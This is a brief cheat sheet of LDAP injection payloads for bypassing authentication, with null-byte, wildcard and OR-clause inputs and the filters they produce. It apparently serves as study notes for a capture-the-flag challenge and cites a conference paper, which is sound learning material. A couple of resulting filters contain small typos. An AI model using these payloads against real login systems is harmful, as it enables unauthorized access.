LDAP injection
===
Access Control Bypass

ex.
```js
(&(username=USER)(password=PWD))

//null byte
  username: *))%00
(&(usernam =*))%00//)(password=PWD))
//wild card
  username: *
  password: *)(&
(&(username=*)(password=*)(&))

//or clause
  username: *)(|(userPassword= 
  password: *)
(&(username=*)(|(password=)(password=*)))
```

ref.
- https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-authentication
- http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202008%20%20-%20LDAP%20Injection%20&%20Blind%20LDAP%20Injection.pdf

